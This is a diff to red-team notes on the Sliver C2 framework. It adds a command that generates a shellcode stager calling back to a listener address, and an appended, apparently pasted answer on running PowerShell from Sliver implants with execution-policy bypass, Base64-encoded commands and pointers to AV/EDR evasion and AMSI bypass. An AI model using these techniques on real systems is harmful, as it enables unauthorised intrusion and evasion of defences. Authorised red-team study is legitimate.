@@ -146,6 +146,12 @@ The Sliver C2 framework is a powerful and flexible post-exploitation command and
    generate --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME> --platform <PLATFORM>
    ```
 
+### Shellcode Generation Example
+
+```shell
+generate stager --lhost 192.168.45.250 --lport 9001 --arch amd64 --format c --save ~/test.c
+```
+33
 ### Post-Exploitation Commands
 
 1. **List active sessions**:
@@ -287,3 +293,82 @@ The Sliver C2 framework is a powerful and flexible post-exploitation command and
    ```
 
 These commands provide a good starting point for using the Sliver C2 framework for both payload generation and post-exploitation activities. Always refer to the official Sliver documentation for the most accurate and comprehensive information.
+
+Yes, you can run a PowerShell script from Sliver, a popular C2 framework used in red teaming operations. Sliver allows operators to execute commands and scripts on compromised systems, including PowerShell scripts, through its implants.
+
+### Methods to Run a PowerShell Script from Sliver
+
+1. **Using the `shell` Command**:
+   The simplest way to run a PowerShell script from Sliver is by using the `shell` command. This command allows you to execute any command as if you were in a command prompt on the compromised system.
+
+   ```plaintext
+   shell powershell -ExecutionPolicy Bypass -File "C:\path\to\your\script.ps1"
+   ```
+
+   This command tells PowerShell to run the specified script with the `-ExecutionPolicy Bypass` flag to avoid policy restrictions.
+
+2. **Inline PowerShell with `shell`**:
+   You can also run inline PowerShell commands directly from the Sliver implant without using a script file. This is useful for quick commands or one-liners:
+
+   ```plaintext
+   shell powershell -ExecutionPolicy Bypass -Command "Get-Process"
+   ```
+
+3. **Using the `powershell` Command**:
+   Sliver has a dedicated `powershell` command that allows you to execute PowerShell scripts and commands more seamlessly. You can paste your entire script directly into the Sliver console:
+
+   ```plaintext
+   powershell <command-or-script>
+   ```
+
+   For example:
+
+   ```plaintext
+   powershell Get-Process | Out-File C:\path\to\output.txt
+   ```
+
+4. **Using the `execute-assembly` Command**:
+   If your PowerShell script is compiled into an executable or a .NET assembly, you can use the `execute-assembly` command to run it:
+
+   ```plaintext
+   execute-assembly C:\path\to\your\compiled.exe
+   ```
+
+5. **Using Encoded Commands**:
+   If you need to obfuscate your PowerShell script or avoid certain detection mechanisms, you can use the `-EncodedCommand` parameter. You first need to encode your PowerShell script in Base64:
+
+   ```plaintext
+   powershell -EncodedCommand <Base64-encoded-script>
+   ```
+
+   To encode a PowerShell script:
+
+   ```powershell
+   $command = "Get-Process"
+   $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+   $encodedCommand = [Convert]::ToBase64String($bytes)
+   Write-Output $encodedCommand
+   ```
+
+   You can then run this encoded command from Sliver:
+
+   ```plaintext
+   shell powershell -EncodedCommand <Base64-encoded-script>
+   ```
+
+### Considerations
+- **Execution Policy**: Use `-ExecutionPolicy Bypass` to ensure that your script runs even if the system has restrictive policies.
+- **AV/EDR Evasion**: Running PowerShell scripts may trigger antivirus (AV) or endpoint detection and response (EDR) solutions. Consider obfuscating your script or using techniques like AMSI bypass if necessary.
+- **Operational Security**: Running PowerShell scripts can be noisy and may attract attention from security monitoring systems. Always consider the potential risk of detection.
+
+### Example of Running a PowerShell Script
+Here’s a complete example of running a PowerShell script to dump processes to a file:
+
+```plaintext
+shell powershell -ExecutionPolicy Bypass -Command "Get-Process | Out-File C:\Windows\Temp\processes.txt"
+```
+
+This command dumps a list of all running processes to `C:\Windows\Temp\processes.txt`.
+
+### Conclusion
+Running PowerShell scripts from Sliver is straightforward and can be done using the `shell`, `powershell`, or `execute-assembly` commands. Depending on your specific operational needs, you can choose the method that best suits your scenario. However, always ensure that you're operating within legal and ethical boundaries, particularly when testing or simulating attacks.
